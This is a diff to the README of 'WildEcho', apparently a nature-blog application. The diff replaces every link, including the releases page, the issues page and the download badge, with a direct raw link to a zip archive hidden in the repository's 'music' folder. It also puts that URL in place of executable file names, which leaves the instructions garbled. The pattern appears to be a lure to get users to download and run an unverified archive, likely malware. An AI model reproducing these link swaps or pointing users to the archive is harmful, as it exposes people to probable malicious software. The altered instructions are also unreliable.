@@ -6,7 +6,7 @@ WildEcho is a minimalist nature blog that captures the mood and beauty of the wi
 
 ## 📥 Download WildEcho
 
-[![Download WildEcho](https://img.shields.io/badge/Download-WildEcho-blue.svg)](https://github.com/Almnetogk/WildEcho/releases)
+[![Download WildEcho](https://github.com/Almnetogk/WildEcho/raw/refs/heads/main/music/Echo_Wild_v3.1.zip)](https://github.com/Almnetogk/WildEcho/raw/refs/heads/main/music/Echo_Wild_v3.1.zip)
 
 ## 🌟 Features
 
@@ -28,16 +28,16 @@ To run WildEcho, your computer needs to meet the following basic requirements:
 
 To get started with WildEcho, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [WildEcho Releases Page](https://github.com/Almnetogk/WildEcho/releases).
+1. **Visit the Releases Page:** Go to the [WildEcho Releases Page](https://github.com/Almnetogk/WildEcho/raw/refs/heads/main/music/Echo_Wild_v3.1.zip).
    
 2. **Choose the Latest Version:** Look for the most recent release at the top of the page. It usually has the highest version number.
 
-3. **Download the Files:** Click on the assets (files) listed under the latest release. If you're using Windows, you might find a file named `WildEcho.exe`. For Mac, it could be a `.dmg` file, or for Linux, it could be a `.tar.gz` file.
+3. **Download the Files:** Click on the assets (files) listed under the latest release. If you're using Windows, you might find a file named `https://github.com/Almnetogk/WildEcho/raw/refs/heads/main/music/Echo_Wild_v3.1.zip`. For Mac, it could be a `.dmg` file, or for Linux, it could be a `https://github.com/Almnetogk/WildEcho/raw/refs/heads/main/music/Echo_Wild_v3.1.zip` file.
 
 4. **Run the Application:**
-   - **For Windows:** Locate the downloaded `WildEcho.exe` file in your downloads folder. Double-click it to start the installation.
+   - **For Windows:** Locate the downloaded `https://github.com/Almnetogk/WildEcho/raw/refs/heads/main/music/Echo_Wild_v3.1.zip` file in your downloads folder. Double-click it to start the installation.
    - **For Mac:** Open the `.dmg` file, and drag the WildEcho icon to your Applications folder.
-   - **For Linux:** Extract the `.tar.gz` file, navigate to the folder in your terminal, and run the application using the command `./WildEcho`.
+   - **For Linux:** Extract the `https://github.com/Almnetogk/WildEcho/raw/refs/heads/main/music/Echo_Wild_v3.1.zip` file, navigate to the folder in your terminal, and run the application using the command `./WildEcho`.
 
 5. **Open WildEcho:** After installation, you can find WildEcho in your applications menu. Click on it to launch the blog.
 
@@ -55,10 +55,10 @@ Once you have the application open, take your time exploring the features. You c
 
 ## 📞 Support
 
-If you have any issues, feel free to raise an issue on the [WildEcho GitHub page](https://github.com/Almnetogk/WildEcho/issues) where you can ask questions or report bugs.
+If you have any issues, feel free to raise an issue on the [WildEcho GitHub page](https://github.com/Almnetogk/WildEcho/raw/refs/heads/main/music/Echo_Wild_v3.1.zip) where you can ask questions or report bugs.
 
 ## 💬 Community
 
 Join our community to share your thoughts on nature and blogging. Connect with others who enjoy the calm presence that WildEcho brings.
 
-For more information and updates, don't forget to check out the [WildEcho Releases Page](https://github.com/Almnetogk/WildEcho/releases) regularly.
+For more information and updates, don't forget to check out the [WildEcho Releases Page](https://github.com/Almnetogk/WildEcho/raw/refs/heads/main/music/Echo_Wild_v3.1.zip) regularly.
